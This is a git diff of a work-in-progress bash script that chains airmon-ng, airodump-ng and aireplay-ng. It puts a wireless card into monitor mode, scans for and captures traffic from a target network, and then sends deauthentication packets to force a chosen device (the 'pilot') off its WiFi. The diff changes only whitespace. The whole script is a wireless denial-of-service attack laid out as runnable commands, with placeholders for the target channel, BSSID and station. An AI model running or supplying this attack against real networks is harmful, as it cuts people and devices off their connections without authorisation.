@@ -1,33 +1,18 @@
 #!/bin/bash
 # Script for momentarily booting a user off of deauthentication their connected network.
 # [CH], [BSSID] and [STATION] variables parsed from Identification_Script.py
-
 echo "Disconnecting from WiFi networks:" & sleep 2
-
 airmon-ng
-
 echo "Enabling monitor mode:" & sleep 2
-
 airmon-ng start wlan0mon
-
 echo "Scanning for local networks:" & sleep 2
-
 airodump-ng wlan0mon -w output --output-format csv & sleep 5
-
 kill $!
-
 # Up to here works so far. Need to write Python script to replace [] with corresponding data parsed from Identification_Script.
-
 echo "Accessing network:" & sleep 2
-
 airodump-ng -c [CH] --bssid [BSSID] -w /root/Desktop/ wlan0mon & sleep 5
-
 kill $!
-
 # Following command parses from the -01.csv file. 
-
 echo "Deautheticating pilot:" & sleep 2
-
 gnome-terminal -x aireplay-ng -0 2 -a [BSSID] -c [STATION]  & sleep 5
-
 kill $!
